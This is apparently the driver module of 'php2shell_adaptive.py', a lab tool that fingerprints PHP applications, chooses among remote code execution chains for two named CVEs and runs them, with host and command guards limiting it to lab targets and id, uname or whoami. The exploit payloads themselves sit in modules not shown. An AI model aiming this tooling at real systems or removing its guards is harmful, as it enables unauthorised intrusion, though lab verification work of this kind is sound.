"""Driver: orchestrate fingerprint -> strategy selection -> execution -> report.

Entry point for php2shell_adaptive.py. All scope guards are applied here so
every code path (including forced --strategy) is constrained to lab hosts and
the benign command allowlist.
"""

import argparse
import socket
import sys
from urllib.parse import urlsplit

from . import capabilities, guard, probe
from .apps import ADAPTERS
from .engine import EXECUTORS
from .fingerprint import fingerprint
from .strategies import STRATEGY_ORDER, evaluate, pick


def parse_args(argv):
    ap = argparse.ArgumentParser(
        prog="php2shell_adaptive.py",
        description="Adaptive lab verification driver: fingerprint the target, "
                    "choose the applicable RCE chain, execute, return `id` output. "
                    "Lab targets only; benign allowlist (id|uname|whoami) only.",
    )
    ap.add_argument("host", nargs="?", default="localhost",
                    help="lab host or URL (e.g. localhost or http://localhost:18080)")
    ap.add_argument("-p", "--port", type=int, default=None, help="lab nginx port")
    ap.add_argument("-c", "--cmd", default="id", help="benign base command "
                    f"{guard.ALLOWED_CMDS} (default: id)")
    ap.add_argument("--app", default="auto",
                    choices=["auto", "generic", "wordpress", "joomla"],
                    help="force app type (default: auto-detect)")
    ap.add_argument("--strategy", default="auto", choices=["auto", "all"] + list(STRATEGY_ORDER),
                    help="force a strategy, or 'all' to run every applicable chain "
                         "(default: pick strongest applicable)")
    ap.add_argument("--container", default=None, help="override the FPM container name "
                    "(optional; rung-5b discovers it dynamically via docker)")
    ap.add_argument("--fingerprint-only", action="store_true",
                    help="print the target profile and exit without firing")
    ap.add_argument("--capabilities", action="store_true",
                    help="print the post-Wiz capability matrix and exit")
    ap.add_argument("--capability", default=None,
                    help="run one capability (sapi|pinning|amplify|legacy|lfi|"
                         "leak|offsets|handler|iocs) and exit")
    ap.add_argument("--holders", type=int, default=0,
                    help="stalled workers to hold during --capability "
                         "pinning/leak (default: 3 for pinning, 0 for leak)")
    return ap.parse_args(argv)


def main(argv=None):
    args = parse_args(argv)

    # ---- scope guard: target host + command ----
    try:
        guard.check_cmd(args.cmd)
    except guard.GuardError as e:
        sys.exit(f"[!] {e}")

    target = args.host if "://" in args.host else f"//{args.host}"
    u = urlsplit(target)
    scheme = (u.scheme or "http").lower()
    host = u.hostname
    if host is None:
        sys.exit(f"[!] cannot parse target host: {args.host!r}")
    port = args.port or u.port or 80

    try:
        guard.check_scheme(scheme)
        guard.check_host(host)
    except guard.GuardError as e:
        sys.exit(f"[!] {e}")

    if args.capabilities:
        print("=" * 78)
        print("  php2shell capability matrix (post-Wiz uplift, 2026-10-27)")
        print("=" * 78)
        for c in capabilities.matrix():
            print(f"  [{c['status']:>10}] {c['name']}")
            print(f"               poc:    {c['poc']}")
            print(f"               lab:    {c['lab']}")
            print(f"               source: {c['source']}")
            print(f"               note:   {c['note']}")
        print()
        print("  Run one with: php2shell_adaptive.py <host:port> --capability <key>")
        return 0

    if args.capability:
        key = args.capability
        print(f"[*] capability: {key}  target: http://{host}:{port}")
        ok, lines = capabilities.run_one(key, host, port, holders=args.holders,
                                         container=args.container,
                                         cmd=args.cmd)
        for line in lines:
            print(f"    {line}")
        print()
        print("[EVIDENCE] capability reproduced" if ok
              else "[!] capability did not reproduce (see notes)")
        return 0 if ok else 1

    app_hint = None if args.app == "auto" else args.app

    print("=" * 72)
    print("  php2shell adaptive driver — lab verification (CVE-2026-109618/109619)")
    print(f"  target:  http://{host}:{port}")
    print(f"  command: {args.cmd!r} (benign allowlist {guard.ALLOWED_CMDS})")
    print("=" * 72)

    # ---- fingerprint ----
    try:
        profile = fingerprint(host, port, app_hint=app_hint, container_hint=args.container)
    except (OSError, ConnectionError, socket.timeout) as e:
        print()
        print(f"[!] target http://{host}:{port} is unreachable ({e}).")
        print("    Is the lab up? (docker ps)")
        return 1
    print()
    print("[*] Target profile")
    print(f"    app:           {profile.app_label} ({profile.app_key})")
    print(f"    php/sapi:      {profile.php_version or '?'} / {profile.sapi or '?'}")
    print(f"    upload_progress: {profile.upload_progress}")
    print(f"    memory_limit:  {profile.memory_limit or '?'}")
    print("    findings:")
    for f in profile.findings:
        print(f"      - {f}")

    # ---- strategy selection (evaluated once) ----
    print()
    print("[*] Strategy evaluation")
    results = evaluate(profile, args.cmd)
    for r in results:
        mark = "OK " if r["applicable"] else "-- "
        print(f"    [{mark}] {r['name']}")
        print(f"            requires: {r['precondition']}")
        print(f"            verdict:  {r['reason']}")

    if args.fingerprint_only:
        print()
        print("[*] --fingerprint-only: stopping before any execution.")
        return 0

    if args.strategy == "all":
        targets = [r["key"] for r in results if r["applicable"]]
    else:
        strategy, reason = pick(results, force=args.strategy)
        targets = [strategy] if strategy else []

    print()
    if not targets:
        reason = "; ".join(f"{k}: {next(r['reason'] for r in results if r['key'] == k)}"
                           for k in STRATEGY_ORDER)
        print(f"[!] No applicable RCE strategy: {reason}")
        print("    (verify the lab is up and its preconditions are in place)")
        return 1

    # ---- execute ----
    final_rc = 1
    for strategy in targets:
        why = next(r["reason"] for r in results if r["key"] == strategy)
        print(f"[*] Executing {strategy} ({why}) -> {args.cmd!r} ...")
        result = EXECUTORS[strategy](profile, args.cmd)
        for f in result.findings:
            print(f"    {f}")
        print()
        print("[*] Result")
        print(f"    executed: {result.executed}")
        print(f"    detail:   {result.detail}")
        if result.output:
            print(f"    output:   {result.output}")
        if result.executed:
            print()
            print(f"[EVIDENCE] {args.cmd!r} executed via {strategy} — output returned to the driver.")
            final_rc = 0
        else:
            print()
            print(f"[!] {strategy} did not produce output ({result.detail})")
        if len(targets) > 1:
            print("-" * 72)

    return final_rc


if __name__ == "__main__":
    sys.exit(main())